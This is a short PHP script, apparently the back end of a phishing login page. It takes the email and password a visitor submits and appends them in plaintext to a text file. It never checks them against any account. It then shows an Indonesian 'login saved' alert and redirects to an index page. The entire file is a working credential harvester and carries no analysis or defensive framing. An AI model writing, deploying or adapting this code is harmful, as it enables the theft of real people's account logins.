<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $data = "\nEmail: " . $email . "\nPassword: " . $password . "\n------------------------------------------------\n";
    $file = '../txt/logins.txt';

    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
        $message = "Login berhasil disimpan";
    } else {
        $message = "Terjadi kesalahan saat menyimpan data";
    }
    echo "<script type='text/javascript'>
            alert('$message');
            window.location.href = '../index.html';
          </script>";
} else {
    echo "Metode tidak valid";
}
?>